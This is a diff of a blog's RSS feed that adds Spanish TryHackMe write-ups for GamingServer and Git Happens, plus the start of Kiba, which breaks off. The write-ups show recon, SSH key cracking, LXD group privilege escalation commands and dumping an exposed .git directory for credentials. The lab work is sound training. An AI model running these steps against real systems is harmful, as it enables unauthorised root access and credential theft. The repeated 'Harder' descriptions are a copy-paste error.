@@ -12,7 +12,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
-    <lastBuildDate>Tue, 18 Aug 2020 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 31 Aug 2020 00:00:00 +0000</lastBuildDate>
     <sy:updatePeriod>daily</sy:updatePeriod>
     <sy:updateFrequency>daily</sy:updateFrequency>
     
@@ -24,6 +24,533 @@
       
       
 
+      
+      <item>
+        <title>TryHackMe - GamingServer</title>
+        <link>https://sckull.github.io/posts/gamingserver/</link>
+        <pubDate>Mon, 31 Aug 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Mon, 31 Aug 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/gamingserver/</guid>
+        <description>Harder es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Harder es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;GamingServer&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;An Easy Boot2Root box for beginners&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;110&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/SuitGuy&#34;&gt;SuitGuy&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Aug 31 21:03:37 2020 as: nmap -sV -o mini_scan gaming.thm&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; gaming.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.202.248&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.28s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Aug 31 21:04:17 2020 -- 1 IP address (1 host up) scanned in 39.71 seconds&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-06-34.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En el codigo fuente encontramos un posible nombre de usuario comentado.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/gamingserver$ gobuster dir -u http://gaming.thm/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -q -x php,html,txt
+/about.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/about.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/secret &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/uploads &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;En &lt;code&gt;/secret&lt;/code&gt; encontramos una clave privada encriptada seguramente de alguno de los usuarios dentro de la maquina. Utilizamos John para obtener la frase de la clave privada.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-12-59.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En &lt;code&gt;/uploads/&lt;/code&gt; encontramos varios archivos entre ellos un posible wordlist.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-12-22.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;john---user&#34;&gt;JOHN - USER&lt;/h2&gt;
+&lt;p&gt;Utilizamos la clave privada y la frase que encontramos con el usuario john en el servicio ssh y logramos obtener una shell y nuestr flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-23-57.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Hacemos una pequeña enumeracion, vemos que el usuario se encuentra en el grupo de &lt;code&gt;lxd&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2&#34;&gt;&lt;strong&gt;LXD&lt;/strong&gt;&lt;/a&gt; para realizar privilege escalation al igual que &lt;a href=&#34;https://sckull.github.io/posts/jokerctf/#privilege-escalation&#34;&gt;&lt;strong&gt;THM - HA Joker CTF&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#LOCAL&lt;/span&gt;
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; lxd-alpine-builder
+./build-alpine -a i686
+
+&lt;span class=&#34;c1&#34;&gt;#GAMINSERVER MACHINE&lt;/span&gt;
+lxc image import ./alpine-v3.12-i686-20200831_2152.tar.gz --alias myimage
+lxc image list
+
+lxc init myimage sckull -c security.privileged&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
+lxc config device add sckull mydevice disk &lt;span class=&#34;nv&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/ &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/mnt/root &lt;span class=&#34;nv&#34;&gt;recursive&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
+lxc start sckull
+lxc &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; sckull /bin/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Logramos obtener una shell con usuario root (container) y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-59-22.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/gamingserver/Screenshot_2020-08-31_19-59-46.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/gamingserver/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/gamingserver/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>TryHackMe - Git Happens</title>
+        <link>https://sckull.github.io/posts/githappens/</link>
+        <pubDate>Mon, 31 Aug 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Mon, 31 Aug 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/githappens/</guid>
+        <description>Harder es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Harder es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;Git Happens&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;Boss wanted me to create a prototype, so here it is! We even used something called &amp;ldquo;version control&amp;rdquo; that made deploying this really easy!&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;80&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/hydragyrum&#34;&gt;hydragyrum&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Aug 31 17:41:27 2020 as: nmap -sV -o mini_scan git.thm&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; git.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.187.108&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.33s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;999&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.14.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Aug 31 17:42:05 2020 -- 1 IP address (1 host up) scanned in 38.04 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web  con un panel en el puerto 80.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/Screenshot_2020-08-31_15-50-32.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En el codigo fuente de la pagina encontramos codigo javascript ofuscado, con un array que contiene informacion &amp;ldquo;desordenada&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/Screenshot_2020-08-31_15-52-22.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
+&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/githappens$ gobuster dir -u http://git.thm/ -w &lt;span class=&#34;nv&#34;&gt;$LIST&lt;/span&gt;/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
+/.git/HEAD &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/dashboard.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;gittools&#34;&gt;GITTOOLS&lt;/h2&gt;
+&lt;p&gt;Encontramos el directorio &lt;code&gt;.git&lt;/code&gt; con gobuster, utilizamos &lt;strong&gt;GitTools&lt;/strong&gt; al igual que en &lt;a href=&#34;https://sckull.github.io/posts/harder/#gittools&#34;&gt;&lt;strong&gt;Harder de TryHackme&lt;/strong&gt;&lt;/a&gt; para obtener la informacion expuesta disponible.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/Screenshot_2020-08-31_15-59-13.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~/tools/GitTools/Dumper/gitdumper.sh http://git.thm/.git/ .
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/Screenshot_2020-08-31_16-00-25.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Una vez utilizado el Dumper ejecutamos el Extractor de GitTools o podemos utilizar el propio Git para recuperar la informacion.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#Git Extractor&lt;/span&gt;
+~/tools/GitTools/Extractor/extractor.sh . .
+
+&lt;span class=&#34;c1&#34;&gt;#Git&lt;/span&gt; 
+git checkout -- .
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Vemos en uno de los archivos anteriores el usuario y contraseña el cual es el objetivo de esta sala.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/Screenshot_2020-08-31_16-14-49.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/githappens/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/githappens/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>gittools</category>
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>TryHackMe - Kiba</title>
+        <link>https://sckull.github.io/posts/kiba/</link>
+        <pubDate>Mon, 31 Aug 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Mon, 31 Aug 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/kiba/</guid>
+        <description>Harder es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Harder es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;Kiba&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;480&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/stuxnet&#34;&gt;stuxnet&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
